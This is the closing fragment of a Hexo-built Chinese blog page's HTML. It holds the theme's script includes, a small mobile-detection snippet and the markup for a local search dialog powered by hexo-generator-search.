src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>